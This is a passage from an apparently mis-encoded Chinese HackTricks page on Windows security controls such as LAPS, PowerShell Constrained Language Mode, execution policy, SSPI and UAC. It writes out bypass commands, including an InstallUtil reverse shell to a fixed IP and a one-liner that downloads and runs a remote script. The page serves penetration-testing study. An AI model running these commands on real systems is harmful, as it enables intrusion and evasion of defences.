<p><a href="https://cube0x0.github.io/Relaying-for-gMSA/"><strong>åœ¨æ­¤å¸–å­ä¸­æ‰¾åˆ°æ›´å¤šä¿¡æ¯</strong></a></p>
<p>æ­¤å¤–ï¼Œè¯·æŸ¥çœ‹æ­¤<a href="https://cube0x0.github.io/Relaying-for-gMSA/">ç½‘é¡µ</a>å…³äºå¦‚ä½•æ‰§è¡Œ<strong>NTLMä¸­ç»§æ”»å‡»</strong>ä»¥<strong>è¯»å–</strong> <strong>gMSA</strong>çš„<strong>å¯†ç </strong>ã€‚</p>
<h2 id="laps"><a class="header" href="#laps">LAPS</a></h2>
<p><strong>æœ¬åœ°ç®¡ç†å‘˜å¯†ç è§£å†³æ–¹æ¡ˆï¼ˆLAPSï¼‰</strong>ï¼Œå¯ä»<a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899">Microsoft</a>ä¸‹è½½ï¼Œå…è®¸ç®¡ç†æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚è¿™äº›å¯†ç æ˜¯<strong>éšæœºç”Ÿæˆ</strong>ã€å”¯ä¸€ä¸”<strong>å®šæœŸæ›´æ”¹</strong>çš„ï¼Œé›†ä¸­å­˜å‚¨åœ¨Active Directoryä¸­ã€‚å¯¹è¿™äº›å¯†ç çš„è®¿é—®é€šè¿‡ACLé™åˆ¶ä¸ºæˆæƒç”¨æˆ·ã€‚æˆäºˆè¶³å¤Ÿçš„æƒé™åï¼Œå¯ä»¥è¯»å–æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚</p>
<p>{% content-ref url="../active-directory-methodology/laps.md" %}
<a href="../active-directory-methodology/laps.html">laps.md</a>
{% endcontent-ref %}</p>
<h2 id="pså—é™è¯­è¨€æ¨¡å¼"><a class="header" href="#pså—é™è¯­è¨€æ¨¡å¼">PSå—é™è¯­è¨€æ¨¡å¼</a></h2>
<p>PowerShell <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/"><strong>å—é™è¯­è¨€æ¨¡å¼</strong></a> <strong>é”å®šäº†è®¸å¤šæœ‰æ•ˆä½¿ç”¨PowerShellæ‰€éœ€çš„åŠŸèƒ½</strong>ï¼Œä¾‹å¦‚é˜»æ­¢COMå¯¹è±¡ï¼Œä»…å…è®¸æ‰¹å‡†çš„.NETç±»å‹ã€åŸºäºXAMLçš„å·¥ä½œæµã€PowerShellç±»ç­‰ã€‚</p>
<h3 id="æ£€æŸ¥-2"><a class="header" href="#æ£€æŸ¥-2"><strong>æ£€æŸ¥</strong></a></h3>
<pre><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
</code></pre>
<h3 id="ç»•è¿‡-1"><a class="header" href="#ç»•è¿‡-1">ç»•è¿‡</a></h3>
<pre><code class="language-powershell">#Easy bypass
Powershell -version 2
</code></pre>
<p>åœ¨å½“å‰çš„Windowsä¸­ï¼Œç»•è¿‡æ–¹æ³•å°†ä¸èµ·ä½œç”¨ï¼Œä½†æ‚¨å¯ä»¥ä½¿ç”¨<a href="https://github.com/padovah4ck/PSByPassCLM"> <strong>PSByPassCLM</strong></a>ã€‚<br />
<strong>è¦ç¼–è¯‘å®ƒï¼Œæ‚¨å¯èƒ½éœ€è¦</strong> <strong><em>æ·»åŠ å¼•ç”¨</em></strong> -&gt; <em>æµè§ˆ</em> -&gt; <em>æµè§ˆ</em> -&gt; æ·»åŠ  <code>C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll</code> å¹¶<strong>å°†é¡¹ç›®æ›´æ”¹ä¸º .Net4.5</strong>ã€‚</p>
<h4 id="ç›´æ¥ç»•è¿‡"><a class="header" href="#ç›´æ¥ç»•è¿‡">ç›´æ¥ç»•è¿‡ï¼š</a></h4>
<pre><code class="language-bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
</code></pre>
<h4 id="åå‘-shell"><a class="header" href="#åå‘-shell">åå‘ shell:</a></h4>
<pre><code class="language-bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
</code></pre>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick"><strong>ReflectivePick</strong></a> æˆ– <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick"><strong>SharpPick</strong></a> æ¥ <strong>æ‰§è¡Œ Powershell</strong> ä»£ç åœ¨ä»»ä½•è¿›ç¨‹ä¸­å¹¶ç»•è¿‡å—é™æ¨¡å¼ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹: <a href="https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode">https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode</a>ã€‚</p>
<h2 id="ps-æ‰§è¡Œç­–ç•¥"><a class="header" href="#ps-æ‰§è¡Œç­–ç•¥">PS æ‰§è¡Œç­–ç•¥</a></h2>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒè®¾ç½®ä¸º <strong>restricted.</strong> ç»•è¿‡æ­¤ç­–ç•¥çš„ä¸»è¦æ–¹æ³•ï¼š</p>
<pre><code class="language-powershell">1Âº Just copy and paste inside the interactive PS console
2Âº Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3Âº Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4Âº Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5Âº Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6Âº Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7Âº Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8Âº Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9Âº Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
</code></pre>
<p>æ›´å¤šä¿¡æ¯å¯ä»¥åœ¨ <a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">è¿™é‡Œ</a> æ‰¾åˆ°ã€‚</p>
<h2 id="å®‰å…¨æ”¯æŒæä¾›è€…æ¥å£-sspi"><a class="header" href="#å®‰å…¨æ”¯æŒæä¾›è€…æ¥å£-sspi">å®‰å…¨æ”¯æŒæä¾›è€…æ¥å£ (SSPI)</a></h2>
<p>æ˜¯ç”¨äºéªŒè¯ç”¨æˆ·çš„ APIã€‚</p>
<p>SSPI å°†è´Ÿè´£ä¸ºæƒ³è¦é€šä¿¡çš„ä¸¤å°æœºå™¨æ‰¾åˆ°åˆé€‚çš„åè®®ã€‚é¦–é€‰çš„æ–¹æ³•æ˜¯ Kerberosã€‚ç„¶åï¼ŒSSPI å°†åå•†ä½¿ç”¨å“ªä¸ªèº«ä»½éªŒè¯åè®®ï¼Œè¿™äº›èº«ä»½éªŒè¯åè®®ç§°ä¸ºå®‰å…¨æ”¯æŒæä¾›è€… (SSP)ï¼Œä»¥ DLL çš„å½¢å¼ä½äºæ¯å° Windows æœºå™¨å†…éƒ¨ï¼Œå¹¶ä¸”ä¸¤å°æœºå™¨å¿…é¡»æ”¯æŒç›¸åŒçš„åè®®æ‰èƒ½è¿›è¡Œé€šä¿¡ã€‚</p>
<h3 id="ä¸»è¦-ssps"><a class="header" href="#ä¸»è¦-ssps">ä¸»è¦ SSPs</a></h3>
<ul>
<li><strong>Kerberos</strong>: é¦–é€‰</li>
<li>%windir%\Windows\System32\kerberos.dll</li>
<li><strong>NTLMv1</strong> å’Œ <strong>NTLMv2</strong>: å…¼å®¹æ€§åŸå› </li>
<li>%windir%\Windows\System32\msv1_0.dll</li>
<li><strong>Digest</strong>: Web æœåŠ¡å™¨å’Œ LDAPï¼Œå¯†ç ä»¥ MD5 å“ˆå¸Œå½¢å¼å­˜åœ¨</li>
<li>%windir%\Windows\System32\Wdigest.dll</li>
<li><strong>Schannel</strong>: SSL å’Œ TLS</li>
<li>%windir%\Windows\System32\Schannel.dll</li>
<li><strong>Negotiate</strong>: ç”¨äºåå•†ä½¿ç”¨çš„åè®®ï¼ˆKerberos æˆ– NTLMï¼Œé»˜è®¤æ˜¯ Kerberosï¼‰</li>
<li>%windir%\Windows\System32\lsasrv.dll</li>
</ul>
<h4 id="åå•†å¯ä»¥æä¾›å¤šç§æ–¹æ³•æˆ–ä»…æä¾›ä¸€ç§"><a class="header" href="#åå•†å¯ä»¥æä¾›å¤šç§æ–¹æ³•æˆ–ä»…æä¾›ä¸€ç§">åå•†å¯ä»¥æä¾›å¤šç§æ–¹æ³•æˆ–ä»…æä¾›ä¸€ç§ã€‚</a></h4>
<h2 id="uac---ç”¨æˆ·å¸æˆ·æ§åˆ¶"><a class="header" href="#uac---ç”¨æˆ·å¸æˆ·æ§åˆ¶">UAC - ç”¨æˆ·å¸æˆ·æ§åˆ¶</a></h2>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">ç”¨æˆ·å¸æˆ·æ§åˆ¶ (UAC)</a> æ˜¯ä¸€ä¸ªå¯ç”¨ <strong>æå‡æ´»åŠ¨çš„åŒæ„æç¤º</strong> çš„åŠŸèƒ½ã€‚</p>
<p>{% content-ref url="uac-user-account-control.md" %}
<a href="uac-user-account-control.html">uac-user-account-control.md</a>
{% endcontent-ref %}</p>
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ç«‹å³è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks" %}</p>
<hr />
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/unconstrained-delegation.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/unconstrained-delegation.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
